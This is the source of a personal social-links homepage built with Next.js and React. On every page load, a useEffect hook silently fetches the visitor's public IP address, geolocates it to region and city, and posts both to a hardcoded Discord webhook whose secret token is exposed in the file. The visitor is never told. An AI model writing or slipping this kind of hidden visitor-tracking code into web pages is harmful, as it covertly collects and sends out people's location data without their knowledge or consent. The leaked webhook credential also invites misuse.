// Imports
import Head from "next/head";
import Link from "next/link";
import Image from "next/image";
import Script from "next/script";
import { use, useEffect, useRef, useState } from "react";
import { useEffectOnce } from "usehooks-ts";
import { useAnimation, motion } from "framer-motion";
import copy from "copy-to-clipboard";
import { publicIp, publicIpv4, publicIpv6 } from "public-ip";
var ipLocation = require("ip-location");

// CSS imports
import styles from "../styles/pages/Home.module.css";

// Component imports
import SecLayout from "../components/_seclayout";
import PageTitle from "../components/parts/PageTitle";
import { get } from "jquery";

// Page
export default function Home() {
	// showDiscordName state
	const [showDiscordName, setShowDiscordName] = useState(false);

	// using use effect, run this code on page load
	useEffect(() => {
		console.log("Hi");
		console.log("Go away");
		console.log("Thanks");
		// post to https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR
		// with the following json data

		async function getLoc(ip: any) {
			const response = await fetch("https://ipapi.co/" + ip + "/json/");
			const data = await response.json();
			return data.region + " - " + data.city;
		}

		async function fetchData() {
			var ipResponse = await fetch("https://api.ipify.org?format=json");
			var ipData = await ipResponse.json();
			var ip: string = ipData.ip;
			await fetch(
				"https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR",
				{
					method: "POST",
					headers: {
						"Content-Type": "application/json",
					},
					body: JSON.stringify({
						// content: ip,
						embeds: [
							{
								color: 0x00ff00,
								fields: [
									{
										name: "IP",
										value: ip,
									},
									{
										name: "Location",
										value: await getLoc(ip),
									},
								],
							},
						],
					}),
				}
			);
		}
		fetchData();
	}, []);

	return (
		<SecLayout>
			{/* Meta tags */}
			<Head>
				<title>Atlas Is Gay 🌈</title>
				<link rel="canonical" href="https://atlasisgay.lol/" />
			</Head>

			{/* ! Main homepage content */}
			<main className={styles.main}>
				{/* 64px div spacer */}
				<div className=""></div>

				<PageTitle>
					{/* <h1 className="text-center container-sm">Atlas</h1> */}
					<p className="text-center container-sm">
						{/* eslint-disable-next-line react/no-unescaped-entities */}
						umm uhhh follow me on{" "}
						<a
							href="https://instagram.com/atlaswuff"
							target="_blank"
							rel="noreferrer"
						>
							insta
						</a>
					</p>
					<p> pls {"<3"}</p>
					<ul className={styles.socialList}>
						<li>
							<a
								href="https://instagram.com/atlaswuff"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/instagram.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
						{/* <li>
							<a
								href="https://twitter.com/AtlasWuff"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/twitter.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li> */}
						<li>
							<a href="https://t.me/AtlasWuff" target="_blank" rel="noreferrer">
								<Image
									src="/img/socials/telegram.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								// href="https://discord.com/users/484343723426054150"
								target="_blank"
								rel="noreferrer"
								onClick={() => setShowDiscordName(!showDiscordName)}
							>
								<Image
									src="/img/socials/discord.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								href="https://steamcommunity.com/id/AtlasWuff/"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/steam.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
					</ul>
					{showDiscordName && (
						<>
							<p className={styles.discName}>
								You can add me on Discord @{" "}
								<a onClick={() => copy("AtlasWuff")}>AtlasWuff</a>
							</p>
							<p className={styles.discClick}>{" (Click to copy) "}</p>
						</>
					)}
					<p className="text-center container-sm" id={styles.dmOpen}>
						{/* eslint-disable-next-line react/no-unescaped-entities */}
						my dms are also open
					</p>
					<p id={styles.dmOpenn}>i love meeting new people</p>
				</PageTitle>
			</main>
		</SecLayout>
	);
}
